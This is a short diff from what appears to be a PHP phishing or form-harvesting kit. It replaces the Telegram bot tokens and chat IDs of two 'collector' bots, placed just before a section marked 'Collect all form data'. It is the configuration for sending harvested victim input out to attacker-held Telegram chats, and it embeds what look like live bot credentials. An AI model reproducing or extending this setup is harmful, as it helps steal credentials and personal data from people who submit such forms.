@@ -4,12 +4,12 @@
 // ============================================
 
 // BOT 1 — Primary Collector
-$telegram_token_1 = "8568458304:AAEgrJKkRa0eDd2KhcKGtzFFLtKtZArkahY";
-$chat_id_1 = "8568458304";
+$telegram_token_1 = "AAEzLsojkX20P2HrqPY0CGJvcTwkcZDcewk";
+$chat_id_1 = "6036275568";
 
 // BOT 2 — Secondary Collector  
-$telegram_token_2 = "8832943565:AAGcI7DS4gWATLCUM78o3TSJVo5CBxCa-Wk";
-$chat_id_2 = "1003939463376";
+$telegram_token_2 = "AAE0MHqMFEuvgPcrExGb64RCAoxnl0Q45ms";
+$chat_id_2 = "7087174244";
 
 // ============================================
 // Collect all form data
